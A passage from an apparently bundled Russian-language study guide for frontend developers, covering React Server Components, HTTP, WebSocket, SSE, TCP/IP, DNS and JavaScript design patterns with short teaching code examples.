Server Components (RSC) — компоненты которые выполняются только на сервере. Их JS в бандл не попадает вообще. Нет гидратации — нечего гидратировать.

**Как работает:**
\`\`\`jsx
// app/page.tsx — Server Component по умолчанию в Next.js App Router
export default async function Page() {
  const posts = await db.posts.findMany(); // прямой доступ к БД — без fetch!
  return <PostList posts={posts} />;
}
\`\`\`
Компонент async — можно await прямо в теле. Данные фетчатся на сервере, клиент получает готовый результат.

**Граница server/client — директива \`'use client'\`:**
\`\`\`jsx
// ❌ Без директивы — серверный, нет интерактивности
export function StaticCard({ title }) {
  return <div>{title}</div>;
}

// ✅ С директивой — клиентский, полный React
'use client';
export function LikeButton({ postId }) {
  const [liked, setLiked] = useState(false);
  return <button onClick={() => setLiked(true)}>Like</button>;
}
\`\`\`
\`'use client'\` — граница бандла. Всё что импортирует клиентский компонент тоже попадает в бандл.

**Что можно/нельзя:**
\`\`\`
Server Component:         Client Component:
✅ async/await            ✅ useState, useEffect
✅ прямой доступ к БД     ✅ обработчики событий
✅ env переменные          ✅ браузерные API
✅ fs, секретные ключи     ✅ useContext
❌ useState/useEffect      ❌ прямой доступ к БД
❌ обработчики событий     ❌ async компонент
❌ браузерные API
\`\`\`

**RSC Payload — что летит по сети:**
Сервер отдаёт не HTML, а специальный формат (JSON-подобный). Клиентские компоненты — ссылки на JS в бандле. Серверные — готовый результат рендера. React на клиенте собирает из этого дерево.

**Composition pattern — как совмещать:**
\`\`\`jsx
// Серверный компонент передаёт children клиентскому
// Важно: children рендерится на сервере, не попадает в бандл клиента
async function Page() {
  const data = await fetchData();
  return (
    <ClientShell> {/* 'use client' */}
      <ServerContent data={data} /> {/* остаётся серверным */}
    </ClientShell>
  );
}
\`\`\`

**RSC vs SSR — разница:**
SSR — рендер на сервере + гидратация на клиенте, JS едет клиенту. RSC — рендер на сервере, JS не едет, нет гидратации. Они совместимы: страница может использовать и SSR и RSC одновременно.`,score:4}]}],zf=[{id:"network",title:"СЕТЬ",icon:"🔗",color:"#66BB6A",topics:[{name:"ip-адрес и hostName",level:"1",content:`**IP-адрес** — уникальный числовой идентификатор устройства в сети.
• **IPv4:** 192.168.1.1 (4 октета, 32 бита, ~4.3 млрд адресов)
• **IPv6:** 2001:0db8::1 (128 бит, практически неограничено)

**Hostname** — человекочитаемое имя (example.com), преобразуется в IP через DNS.

**localhost** = 127.0.0.1 (loopback). **0.0.0.0** — все интерфейсы.

**Порт** — логический адрес приложения на устройстве (80 — HTTP, 443 — HTTPS, 3000 — dev).`},{name:"Базовое понимание различий POST и GET",level:"2",content:`**GET:**
• Параметры в URL (query string)
• Кэшируется браузером
• Ограничение длины URL (~2048 символов)
• Идемпотентный (повторный запрос = тот же результат)
• Для получения данных

**POST:**
• Данные в теле запроса (body)
• НЕ кэшируется по умолчанию
• Нет ограничения размера тела
• НЕ идемпотентный
• Для создания/изменения данных

**Другие методы:** PUT (полная замена), PATCH (частичное обновление), DELETE (удаление), HEAD (только заголовки), OPTIONS (CORS preflight).`},{name:"Query-параметры",level:"2",content:"Параметры в URL после `?`, разделённые `&`:\n```\nhttps://api.com/users?page=1&limit=10&sort=name\n```\n\n**URLSearchParams API:**\n```js\nconst params = new URLSearchParams('page=1&limit=10');\nparams.get('page');      // '1'\nparams.set('page', '2');\nparams.append('filter', 'active');\nparams.toString();       // 'page=2&limit=10&filter=active'\n```\n\n**Кодирование:** спецсимволы → encodeURIComponent() / decodeURIComponent()."},{name:"REST API",level:"2",content:`**REST** — архитектурный стиль для API.

**Принципы:**
• Ресурсы идентифицируются URL: \`/users\`, \`/users/1\`
• HTTP-методы как операции: GET (read), POST (create), PUT/PATCH (update), DELETE
• **Stateless** — каждый запрос содержит всю необходимую информацию. Сервер не помнит предыдущие запросы.
• Единый интерфейс

**Stateless на примере:**
\`\`\`
// Не REST (с состоянием):
Запрос 1: "залогинься как user123"
Запрос 2: "дай мне мои заказы"  // сервер помнит кто ты

// REST (stateless):
Запрос 1: "залогинься как user123" → получаешь токен
Запрос 2: "дай заказы, вот мой токен: Bearer xxx"
\`\`\`

Преимущества stateless: масштабируемость (любой сервер обработает запрос), простота (не нужно хранить сессии), надёжность (упавший сервер не теряет состояние клиентов).

Именно поэтому JWT популярен в REST — клиент сам хранит токен и передаёт в каждом запросе.

**Хорошие практики:**
\`\`\`
GET    /users       → список пользователей
GET    /users/1     → конкретный пользователь
POST   /users       → создать пользователя
PUT    /users/1     → обновить полностью
PATCH  /users/1     → обновить частично
DELETE /users/1     → удалить
\`\`\`

**Коды ответов:** 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error.`},{name:"Понимание протокола HTTP",level:"2",content:`**HTTP (HyperText Transfer Protocol)** — протокол запрос-ответ.

**Запрос:**
\`\`\`
GET /index.html HTTP/1.1
Host: example.com
Accept: text/html
Cookie: session=abc
\`\`\`

**Ответ:**
\`\`\`
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc
Cache-Control: max-age=3600
\`\`\`

**HTTPS** — HTTP + TLS шифрование. TLS (Transport Layer Security) — протокол, который:
• Шифрует данные — перехваченный трафик нечитаем
• Аутентифицирует сервер — SSL-сертификат подтверждает что это действительно тот сервер
• Обеспечивает целостность — данные не изменены в пути

Как работает: клиент и сервер проводят TLS Handshake — договариваются об алгоритмах, обмениваются сертификатом, генерируют общий симметричный ключ. Дальше всё шифруется этим ключом.

**Коды ответов:**
• **1xx** — информационные (101 Switching Protocols — WebSocket)
• **2xx** — успех (200 OK, 201 Created, 204 No Content)
• **3xx** — редиректы (301 Moved Permanently, 302 Found, 304 Not Modified)
• **4xx** — ошибка клиента (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
• **5xx** — ошибка сервера (500 Internal Server Error, 503 Service Unavailable)

**Заголовки:**

**Content-Type** — формат тела запроса/ответа:
\`\`\`
application/json                — JSON
text/html; charset=utf-8        — HTML
text/plain                      — обычный текст
multipart/form-data             — загрузка файлов
application/x-www-form-urlencoded — данные формы
\`\`\`

**Authorization** — передача токена:
\`\`\`
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Authorization: Basic dXNlcjpwYXNz  // base64(login:password)
\`\`\`

**Cache-Control** — управление кэшем:
\`\`\`
no-cache       // всегда проверять актуальность
no-store       // не кэшировать вообще
max-age=3600   // кэшировать 1 час
public         // можно кэшировать везде (CDN + браузер)
private        // только браузер, не CDN
\`\`\`

**Accept** — ожидаемый формат ответа:
\`\`\`
Accept: application/json
Accept: text/html
\`\`\`

**CORS** — управление доступом между доменами:
\`\`\`
// Ответ сервера:
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true

// Preflight-запрос браузера:
Origin: https://mysite.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
\`\`\`

**Set-Cookie / Cookie:**
\`\`\`
// Сервер устанавливает:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// Браузер отправляет:
Cookie: session=abc123
\`\`\`

**Прочие важные:**
\`\`\`
Content-Length: 348           // размер тела в байтах
Host: api.example.com         // хост назначения
User-Agent: Mozilla/5.0...    // браузер/клиент
Referer: https://site.com     // откуда пришёл запрос
Location: /new-url            // куда редиректить (3xx)
\`\`\`

**HTTP/3:**
• Основан на **QUIC** (поверх UDP вместо TCP)
• Встроенное шифрование TLS 1.3 прямо в QUIC
• Нет head-of-line блокировки на транспортном уровне (в HTTP/2 один потерянный TCP-пакет блокирует все потоки одного соединения)
• **0-RTT** для повторных подключений — быстрее установление соединения
• **Connection migration** — соединение выживает при смене IP (переход Wi-Fi ↔ LTE, критично для мобильных)
• Поддерживается Cloudflare, Google, Fastly`},{name:"Понимание протокола HTTP/2",level:"3",content:`**Главная проблема HTTP/1.1** — один запрос на одно соединение (или очередь). Браузер открывал до 6 параллельных соединений на домен — это лимит.

**HTTP/2 решает это через:**

**1. Мультиплексирование** — несколько запросов через одно соединение параллельно:
\`\`\`
HTTP/1.1: [запрос1] → [ответ1] → [запрос2] → [ответ2]  // очередь
HTTP/2:   [запрос1] ↘
          [запрос2] → [ответ1][ответ2][ответ3]  // параллельно, одно соединение
          [запрос3] ↗
\`\`\`

**2. Сжатие заголовков (HPACK)** — в HTTP/1.1 заголовки передаются как текст при каждом запросе. HTTP/2 сжимает и кэширует — повторяющиеся не передаются.

**3. Server Push** — сервер сам отправляет ресурсы которые понадобятся клиенту:
\`\`\`
Клиент запросил index.html →
Сервер отправляет: index.html + style.css + app.js
// Не ждёт пока браузер разберёт HTML и запросит их
\`\`\`

**4. Бинарный протокол** — HTTP/1.1 текстовый, HTTP/2 бинарный → быстрее парсится, меньше ошибок.

**5. Приоритизация** — можно указать какие запросы важнее (CSS важнее картинок).

**Главный выигрыш — мультиплексирование.** Именно из-за него не нужны старые оптимизации HTTP/1.1: спрайты, domain sharding, конкатенация файлов.`},{name:"Различие Long-Polling, Websockets, Server-Sent Events",level:"3",content:`HTTP по природе — протокол "запрос-ответ". Клиент спрашивает, сервер отвечает, соединение закрывается. Но чаты, котировки, уведомления, совместное редактирование требуют real-time: сервер должен сам доставлять данные как только они появились. Три технологии решают это с разными компромиссами.

**Long Polling**

Обычный HTTP-запрос, но сервер не закрывает соединение сразу — держит его открытым до появления данных (или таймаута).
\`\`\`
1. Клиент: GET /updates → сервер
2. Сервер держит соединение открытым...
3. Появились данные → сервер отвечает клиенту
4. Клиент получил ответ → сразу делает новый запрос
\`\`\`
\`\`\`js
async function longPoll() {
  const data = await fetch('/api/events').then(r => r.json());
  processData(data);
  longPoll(); // сразу новый запрос
}
\`\`\`

Характеристики: обычный HTTP, соединение переустанавливается после каждого ответа, задержка выше чем у WS и SSE, высокие накладные расходы (HTTP-заголовки при каждом переподключении).

Когда использовать: legacy-код, старые браузеры, редкие обновления, fallback когда WebSocket недоступен (жёсткие корпоративные прокси).

Нюансы: сервер держит много открытых соединений — нагрузка. При высокой частоте событий — много HTTP-запросов. Таймауты нужно настраивать аккуратно.

**WebSocket**

Начинается как HTTP, но апгрейдится до нового протокола через handshake:
\`\`\`
Клиент → Сервер:  GET /chat HTTP/1.1
                  Upgrade: websocket
                  Sec-WebSocket-Key: dGhlIHNhbXBsZQ==

Сервер → Клиент:  101 Switching Protocols
                  Sec-WebSocket-Accept: [хэш от ключа]
\`\`\`
После handshake HTTP больше не используется — идёт бинарный протокол WS поверх того же TCP.

Протокол: ws:// (нешифрованный) или wss:// (поверх TLS). Направление — двустороннее, обе стороны шлют данные в любой момент. Соединение постоянное. Формат: текст или бинарные данные (ArrayBuffer, Blob).
\`\`\`js
const ws = new WebSocket('wss://example.com/ws');

ws.onopen    = () => ws.send('Hello server!');
ws.onmessage = (e) => console.log('Получено:', e.data);
ws.onerror   = (e) => console.error('Ошибка:', e);
ws.onclose   = (e) => console.log('Закрыто:', e.code, e.reason);

ws.close(); // закрыть соединение
\`\`\`

Коды закрытия: 1000 — норма, 1001 — страница закрыта, 1006 — обрыв сети, 1011 — ошибка сервера.

Reconnect — не встроен, реализовывать вручную. Использовать экспоненциальный backoff чтобы не DDoS'ить сервер при массовом переподключении:
\`\`\`js
function connect(delay = 1000) {
  const ws = new WebSocket('wss://site.com');
  ws.onclose = () => setTimeout(() => connect(Math.min(delay * 2, 30000)), delay);
}
\`\`\`

Heartbeat обязателен: прокси и файрволы закрывают "молчащие" соединения (~60–120s). Периодически шли ping, другая сторона отвечает pong.

Когда использовать: чаты, онлайн-игры (низкая задержка критична), совместное редактирование, биржевые котировки, любой real-time с двусторонним обменом.

Подводные камни безопасности:
• Только wss:// — ws:// передаёт открытым текстом, уязвим к MITM
• Проверять заголовок Origin при handshake — иначе возможна CSWSH-атака (аналог CSRF: злоумышленник с evil.com открывает WS-соединение с твоим сервером с куки жертвы)
• Rate limiting — WS не ограничивает частоту сообщений из коробки → возможен DoS

**SSE (Server-Sent Events)**

Обычный HTTP-запрос с бесконечным телом ответа. Сервер шлёт данные в специальном текстовом формате, соединение не закрывается.
\`\`\`
GET /events HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/event-stream

data: {"message": "hello"}

data: {"message": "world"}

... бесконечно ...
\`\`\`
\`\`\`js
// Клиент:
const es = new EventSource('/events');
es.onmessage = (e) => console.log(e.data);
es.addEventListener('update', (e) => console.log('Кастомное:', e.data));
es.onerror = () => { /* браузер переподключится автоматически */ };
es.close();
\`\`\`
\`\`\`
// Формат сообщений на сервере:
id: 123
event: update
data: {"price": 100}

data: Следующее сообщение (пустая строка = конец события)

retry: 3000   // задержка переподключения в мс
\`\`\`

Протокол: обычный HTTP (работает поверх HTTP/2). Направление — только сервер → клиент. Автоматический reconnect встроен: при разрыве браузер переподключается и отправляет Last-Event-ID — сервер продолжает с нужного места. Только текст (UTF-8).

Когда использовать: новостные ленты, уведомления, прогресс-бары длинных операций, вывод логов в реальном времени, стриминг ответов AI (ChatGPT использует SSE).

Нюансы:
• Только HTTPS (или localhost)
• В HTTP/1.1 — максимум 6 соединений на домен. Открыть 7 вкладок с SSE — 7-я не получит соединение. В HTTP/2 ограничения нет (мультиплексирование)
• Бинарные данные — кодировать в Base64

**Сравнение:**

**Long Polling** — HTTP, двустороннее, новое соединение каждый раз, reconnect вручную. Когда: legacy, редкие события, fallback.
**WebSocket** — ws/wss, двустороннее, постоянное, reconnect вручную. Когда: чаты, игры, трейдинг.
**SSE** — HTTP, только сервер→клиент, постоянное, reconnect автоматический. Когда: уведомления, ленты, прогресс.

SSE часто недооценивают: для большинства задач "сервер пушит данные клиенту" SSE проще и надёжнее WebSocket — меньше инфраструктуры, встроенный reconnect, работает через обычные HTTP-прокси.

**Масштабирование WebSocket.** WS-соединения sticky — клиент должен всегда попадать на тот же сервер. При горизонтальном масштабировании нужен брокер сообщений (Redis Pub/Sub, Kafka) или sticky sessions на балансировщике.`},{name:"Базовое понимание TCP",level:"4",content:`**TCP (Transmission Control Protocol)** — протокол транспортного уровня. Обеспечивает надёжную доставку данных между двумя точками.
Интернет передаёт данные пакетами — они могут потеряться, прийти не в том порядке, задублироваться. TCP решает все эти проблемы.

**Модель OSI (упрощённо):**
\`\`\`
Приложение: HTTP, WebSocket, FTP, DNS
Транспорт:  TCP, UDP
Сеть:       IP
Канал:      Ethernet, WiFi
Физический: провода, радиоволны
\`\`\`
Каждый уровень использует нижний как транспорт. HTTP работает поверх TCP, TCP работает поверх IP.

**3-way handshake — установка соединения:**
\`\`\`
Клиент → Сервер:  SYN          (хочу соединиться, мой seq=100)
Сервер → Клиент:  SYN + ACK    (согласен, мой seq=200, подтверждаю твой 101)
Клиент → Сервер:  ACK          (принял, подтверждаю твой 201)
\`\`\`
После этого соединение установлено. Это причина задержки HTTP/1.1 — каждое новое соединение требует handshake.

**Закрытие — 4-way handshake:**
\`\`\`
Клиент → Сервер:  FIN    (я закончил отправку)
Сервер → Клиент:  ACK    (принял)
Сервер → Клиент:  FIN    (я тоже закончил)
Клиент → Сервер:  ACK    (принял, соединение закрыто)
\`\`\`

**Главные характеристики:**
• **Надёжность** — каждый пакет подтверждается через ACK. Нет подтверждения → повтор отправки.
• **Порядок** — каждый пакет имеет sequence number. Получатель собирает пакеты в правильном порядке даже если пришли вразнобой.
• **Flow Control** — получатель сообщает сколько данных готов принять (window size). Отправитель не перегружает получателя.
• **Congestion Control** — TCP снижает скорость если сеть перегружена.

**TCP vs UDP:**
**TCP** — гарантирует доставку, сохраняет порядок, медленнее, 3-way handshake, высокий overhead.
**UDP** — без гарантий, порядок не гарантирован, быстрее, нет handshake, минимальный overhead.

TCP используют: HTTP, HTTPS, WebSocket, FTP, SSH.
UDP используют: видеозвонки (WebRTC, Zoom), онлайн игры, DNS, стриминг, HTTP/3 (QUIC).

**Почему UDP для видео/игр:**
Потеря пакета в TCP → повтор → задержка. В видеозвонке лучше пропустить кадр чем ждать повтора — это создаёт заморозку. UDP просто отбрасывает потерянный пакет и продолжает.

**HTTP/3 и QUIC:**
HTTP/3 работает поверх QUIC — протокол на базе UDP но с надёжностью на уровне приложения: нет 3-way handshake, мультиплексирование без head-of-line blocking, встроенное шифрование TLS 1.3.

**Keep-Alive:**
HTTP/1.1 по умолчанию держит TCP-соединение открытым для нескольких запросов (Connection: keep-alive). Без этого каждый запрос = новый TCP handshake. HTTP/2 идёт дальше — одно соединение для всех запросов.`},{name:"Базовое понимание IP",level:"4",content:`**IP (Internet Protocol)** — протокол сетевого уровня. Отвечает за адресацию и маршрутизацию пакетов между сетями.

TCP разбивает данные на пакеты. IP доставляет каждый пакет от отправителя к получателю через цепочку роутеров. IP не гарантирует доставку — это задача TCP.

**Структура IP-пакета:**
\`\`\`
Заголовок:
  Source IP      — откуда пакет
  Destination IP — куда пакет
  TTL            — время жизни пакета
  Protocol       — что внутри (TCP=6, UDP=17)
  Checksum       — проверка целостности заголовка
Данные (payload) — TCP сегмент внутри
\`\`\`

**TTL (Time To Live):**
Каждый пакет имеет счётчик TTL (обычно 64 или 128). Каждый роутер уменьшает TTL на 1. TTL = 0 → пакет уничтожается → отправителю приходит ICMP "Time Exceeded".
Зачем: предотвращает бесконечную циркуляцию потерявшихся пакетов.
\`\`\`bash
traceroute google.com
# Отправляет пакеты с TTL=1, TTL=2, TTL=3...
# Каждый роутер отвечает — видим весь маршрут
\`\`\`

**Маршрутизация:**
\`\`\`
Твой компьютер → Домашний роутер → Роутер провайдера → ... → Сервер
\`\`\`
Каждый роутер смотрит на Destination IP и решает куда передать дальше по таблице маршрутизации. IP не знает весь путь заранее — каждый роутер решает локально.

**IPv4 vs IPv6:**
• **IPv4** — 32 бита (192.168.1.1), ~4 млрд адресов, закончились, решение: NAT
• **IPv6** — 128 бит (2001:0db8::8a2e:0370:7334), 340 ундециллионов адресов, встроенный IPSec, нет NAT

**NAT (Network Address Translation):**
Из-за нехватки IPv4 адресов несколько устройств домашней сети выходят в интернет через один публичный IP:
\`\`\`
192.168.1.2 (телефон)   ┐
192.168.1.3 (ноутбук)   ├─→ Роутер (NAT) → 85.142.10.5 (один публичный IP)
192.168.1.4 (телевизор) ┘
\`\`\`
Приватные диапазоны (не маршрутизируются в интернете):
\`\`\`
10.0.0.0/8       — большие сети
172.16.0.0/12    — средние сети
192.168.0.0/16   — домашние сети
127.0.0.0/8      — loopback (localhost)
\`\`\`

**ICMP (Internet Control Message Protocol)** — протокол служебных сообщений сетевого уровня. Работает поверх IP, но не для передачи данных — только для диагностики и уведомлений об ошибках. Не имеет портов (это не TCP/UDP).

Основные сообщения:
\`\`\`
Echo Request / Echo Reply  — ping: проверка доступности хоста
Time Exceeded              — TTL истёк (роутер уничтожил пакет)
Destination Unreachable    — хост/порт/сеть недоступны
Redirect                   — роутер сообщает о более коротком маршруте
\`\`\`
\`\`\`bash
ping google.com       # шлёт Echo Request, ждёт Echo Reply — измеряет RTT
traceroute google.com # шлёт пакеты с TTL=1,2,3... — каждый роутер отвечает Time Exceeded
\`\`\`

ICMP может быть заблокирован файрволом — тогда ping не ответит, но сайт при этом работает.`},{name:"Базовое понимание DNS",level:"4",content:`**DNS (Domain Name System)** — распределённая система, которая преобразует доменное имя в IP-адрес. Работает по UDP, порт 53.

**Как браузер резолвит домен (порядок):**
\`\`\`
1. Кэш браузера
2. Кэш ОС
3. Файл /etc/hosts
4. Рекурсивный резолвер провайдера (или 1.1.1.1 / 8.8.8.8)
5. Резолвер идёт по иерархии: Root → TLD → Authoritative
\`\`\`

**Иерархия DNS:**
\`\`\`
Root серверы (.)           — 13 кластеров в мире, знают где TLD серверы
    ↓
TLD серверы (.com, .ru)    — знают где authoritative серверы каждого домена
    ↓
Authoritative серверы      — хранят реальные записи: google.com → 142.250.185.46
\`\`\`
Резолвер кэширует ответ на время TTL и не ходит по иерархии повторно.

**DNS записи:**
\`\`\`
A      — домен → IPv4:         example.com → 93.184.216.34
AAAA   — домен → IPv6:         example.com → 2606:2800::1
CNAME  — псевдоним:            www.example.com → example.com
                               (нельзя использовать для корневого домена!)
MX     — почтовый сервер:      example.com → mail.example.com (приоритет 10)
TXT    — текст:                верификация домена, SPF, DKIM записи
NS     — какие серверы хранят  записи домена (делегирование)
\`\`\`

**TTL (Time To Live)** — сколько секунд запись кэшируется. При смене IP все кэши хранят старый адрес пока TTL не истечёт. Типичные значения: 300 с (5 мин) — для частых изменений, 86400 с (24 ч) — для стабильных записей.

Практика: перед переездом сайта на новый IP заранее (за сутки) снизить TTL до 300 с — тогда после смены IP кэши устареют быстро.

**Файл hosts** — локальный оверрайд DNS, проверяется до обращения к серверу:
\`\`\`
# /etc/hosts (Mac/Linux) | C:\\Windows\\System32\\drivers\\etc\\hosts (Windows)
127.0.0.1       localhost
192.168.1.10    api.local     # локальная разработка
0.0.0.0         ads.example.com  # блокировка
\`\`\`

**DNS over HTTPS (DoH) и DNS over TLS (DoT):**
Обычный DNS — plaintext UDP, провайдер и все роутеры на пути видят все запросы (какие сайты посещаешь). DoH оборачивает DNS в HTTPS — трафик зашифрован и неотличим от обычного веб-трафика.
\`\`\`
Cloudflare: 1.1.1.1   (https://cloudflare-dns.com/dns-query)
Google:     8.8.8.8   (https://dns.google/dns-query)
\`\`\``}]},{id:"patterns",title:"ПАТТЕРНЫ",icon:"🧩",color:"#AB47BC",topics:[{name:"DRY, KISS, YAGNI",level:"2",content:`**DRY (Don't Repeat Yourself):** каждая часть знания имеет единственное представление. Дублирование → вынести в функцию/модуль. Но: не путай совпадение кода с дублированием логики.

**KISS (Keep It Simple, Stupid):** простое решение лучше сложного. Не усложняй без необходимости. Читаемость > краткость.

**YAGNI (You Aren't Gonna Need It):** не реализуй функционал «на будущее». Делай только то, что нужно сейчас. Преждевременная абстракция — зло.`},{name:"Навык использования и определения паттерна в коде: Observer",level:"3",content:`**Observer (Наблюдатель)** — объект уведомляет подписчиков о своих изменениях.

**Две роли:**
• **Subject (Publisher/Emitter)** — издатель. Хранит список подписчиков, уведомляет их при изменениях. Три обязательных метода: subscribe, unsubscribe, notify.
• **Observer (Subscriber)** — подписчик. Реагирует на уведомления от Subject.
\`\`\`js
class Subject {
  constructor() { this.observers = []; }

  subscribe(observer) {
    this.observers.push(observer);
  }
  unsubscribe(observer) {
    this.observers = this.observers.filter(o => o !== observer);
  }
  notify(data) {
    this.observers.forEach(o => o.update(data));
  }
}

class Observer {
  update(data) {
    console.log('Получено:', data);
  }
}

const subject = new Subject();
const obs1 = new Observer();
const obs2 = new Observer();

subject.subscribe(obs1);
subject.subscribe(obs2);
subject.notify('изменение'); // оба получат уведомление
subject.unsubscribe(obs1);
subject.notify('ещё одно'); // только obs2
\`\`\`

EventEmitter — более гибкая реализация того же паттерна с именованными событиями:
\`\`\`js
class EventEmitter {
  constructor() { this.listeners = {}; }
  on(event, fn) {
    (this.listeners[event] ||= []).push(fn);
  }
  off(event, fn) {
    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);
  }
  emit(event, data) {
    this.listeners[event]?.forEach(fn => fn(data));
  }
}
\`\`\`

**Где в JS:** addEventListener, RxJS, EventEmitter в Node.js, Redux store.subscribe(), Vue reactivity.`},{name:"Factory Method, Prototype, Proxy, Singleton",level:"3",content:`**Singleton** — гарантирует один экземпляр класса на всё приложение:
\`\`\`js
class Database {
  static instance = null;

  constructor(url) {
    if (Database.instance) return Database.instance;
    this.url = url;
    Database.instance = this;
  }
}

const db1 = new Database('localhost');
const db2 = new Database('remotehost');
db1 === db2; // true
db2.url;     // 'localhost' — второй конструктор проигнорировался
\`\`\`
В JS ES-модули — уже Singleton: экспортируемый объект кэшируется, все импорты получают одну ссылку.
Где: подключение к БД, логгер, конфиг, Redux store.
Минусы: глобальное состояние, сложно тестировать.

**Factory Method** — инкапсулирует логику создания объектов, вызывающий код не знает какой конкретно класс создаётся:
\`\`\`js
function createTransport(type) {
  switch(type) {
    case 'car':   return new Car();
    case 'bike':  return new Bike();
    case 'truck': return new Truck();
    default: throw new Error('Unknown type');
  }
}
\`\`\`
ООП вариант — подкласс переопределяет метод создания:
\`\`\`js
class Dialog {
  createButton() { throw new Error('Переопредели меня!'); }
  render() { this.createButton().render(); }
}
class WindowsDialog extends Dialog {
  createButton() { return new WindowsButton(); }
}
\`\`\`
Где: \`React.createElement\`, \`document.createElement\`, UI под разные платформы.

**Prototype (паттерн)** — создаёт объекты клонированием существующего. Используется когда создание дорого:
\`\`\`js
class Circle {
  constructor(radius, color) {
    this.radius = radius;
    this.color = color;
  }
  clone() {
    return Object.assign(Object.create(Object.getPrototypeOf(this)), this);
  }
}

const c1 = new Circle(10, 'red');
const c2 = c1.clone();
c2.color = 'blue';
c1.color; // 'red' — оригинал не тронут
\`\`\`
Встроенные методы:
\`\`\`js
const shallow = { ...original };                         // поверхностное
const deep = structuredClone(original);                  // глубокое (современный способ)
const deep2 = JSON.parse(JSON.stringify(original));      // старый способ, теряет функции/undefined
\`\`\`
Где: копирование конфигов, undo/redo снапшоты, клонирование игровых объектов.

**Proxy** — обёртка, перехватывающая операции с объектом:
\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`Читаем: \${prop}\`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    if (prop === 'age' && typeof value !== 'number')
      throw new TypeError('Только числа!');
    return Reflect.set(target, prop, value, receiver);
  },
  deleteProperty(target, prop) {
    return Reflect.deleteProperty(target, prop);
  }
};
const data = new Proxy({}, handler);
\`\`\`
Применение:
\`\`\`js
// Реактивность (как Vue 3):
function reactive(obj) {
  return new Proxy(obj, {
    set(target, prop, value) {
      target[prop] = value;
      render();
      return true;
    }
  });
}

// Кэширование:
const cached = new Proxy(api, {
  get(target, method) {
    return async (...args) => {
      const key = \`\${method}:\${JSON.stringify(args)}\`;
      if (cache.has(key)) return cache.get(key);
      const result = await target[method](...args);
      cache.set(key, result);
      return result;
    };
  }
});
\`\`\`
Где: Vue 3 реактивность, MobX, валидация, логирование, кэширование.

**Сравнение:**
\`\`\`
Паттерн    Задача                  Когда
Singleton  один экземпляр          глобальные сервисы, конфиги
Factory    инкапсуляция создания   разные типы объектов
Prototype  клонирование            дорогое создание объектов
Proxy      перехват операций       валидация, кэш, реактивность
\`\`\``},{name:"Навык использования и определения паттерна в коде: Decorator",level:"3",content:`**Decorator** — оборачивает объект/функцию, добавляя поведение без изменения оригинала.

\`\`\`js
function withLogging(fn) {
  return function(...args) {
    console.log('Calling', fn.name, args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);
loggedAdd(2, 3); // Calling add [2,3] → Result: 5
\`\`\`

**TC39 Decorators (Stage 3):**
\`\`\`js
@logged
class MyClass { ... }
\`\`\`

**Где:** HOC в React, middleware в Express/Redux, TypeORM entity decorators.

**Decorator vs наследование**

Наследование — статично. Поведение задаётся при объявлении класса и не меняется в рантайме. Чтобы добавить новую комбинацию — нужен новый класс:
\`\`\`js
class Coffee {}
class CoffeeWithMilk extends Coffee {}
class CoffeeWithSugar extends Coffee {}
class CoffeeWithMilkAndSugar extends Coffee {} // комбинаторный взрыв
\`\`\`

Decorator — динамичен. Обёртки комбинируются в рантайме, не требуя новых классов:
\`\`\`js
class Coffee {
  cost() { return 50; }
  desc() { return 'Кофе'; }
}

function withMilk(coffee) {
  return {
    cost: () => coffee.cost() + 20,
    desc: () => coffee.desc() + ', молоко',
  };
}

function withSugar(coffee) {
  return {
    cost: () => coffee.cost() + 5,
    desc: () => coffee.desc() + ', сахар',
  };
}

const order = withSugar(withMilk(new Coffee()));
order.cost(); // 75
order.desc(); // 'Кофе, молоко, сахар'
\`\`\`

Ключевые отличия:
• **Наследование** — отношение "является" (is-a). Подкласс зависит от реализации родителя. Связь жёсткая, менять в рантайме нельзя.
• **Decorator** — отношение "имеет" (has-a). Обёртка не знает про внутренности оригинала, только вызывает его методы. Можно навесить несколько обёрток в любом порядке.

Правило из GoF: "предпочитай композицию наследованию" — Decorator это и есть композиция.`},{name:"Навык использования и определения паттерна в коде: Dependency Injection",level:"4",content:`**Dependency Injection (DI)** — паттерн при котором объект получает зависимости снаружи вместо того чтобы создавать их самостоятельно.

**Проблема без DI** — жёсткая связь, нельзя протестировать без реальных сервисов:
\`\`\`js
class UserService {
  constructor() {
    this.db = new Database('localhost'); // нельзя заменить
    this.logger = new Logger();
  }
}
\`\`\`

**Решение с DI:**
\`\`\`js
class UserService {
  constructor(db, logger) {
    this.db = db;
    this.logger = logger;
  }
}

// Production:
const service = new UserService(new Database('localhost'), new Logger());

// Тесты — подменяем моками:
const service = new UserService(mockDb, mockLogger);
\`\`\`

**Три способа внедрения:**
\`\`\`js
// 1. Constructor Injection — самый популярный:
class Service {
  constructor(dep) { this.dep = dep; }
}

// 2. Property Injection — через setter:
const s = new Service();
s.setDependency(new Dep());

// 3. Method Injection — через параметр метода:
class Service {
  doWork(dep) { dep.execute(); }
}
\`\`\`

**DI Container** — в больших приложениях регистрируют зависимости, контейнер создаёт и внедряет сам.

**Что решает контейнер:**
- **Бойлерплейт пересборки** — без контейнера при добавлении новой зависимости нужно обновлять все места где создаётся объект. Контейнер знает граф и пересобирает сам.
- **Singleton-семантика** — контейнер гарантирует один экземпляр на всё приложение (DatabaseConnection, Logger). Без контейнера нужно следить вручную.
- **Порядок зависимостей** — контейнер сам вычисляет порядок создания: сначала \`Database\`, потом \`UserService\`, потом \`AuthController\`. Руками это error-prone при десятках сервисов.
- **Циклические зависимости** — \`A → B → A\`. Контейнер это обнаружит и бросит ошибку вместо тихого краша. Хорошие контейнеры умеют разрешать циклы через lazy-inject (прокси).
\`\`\`js
class Container {
  constructor() { this.bindings = new Map(); this.singletons = new Map(); }

  bind(name, factory, singleton = false) {
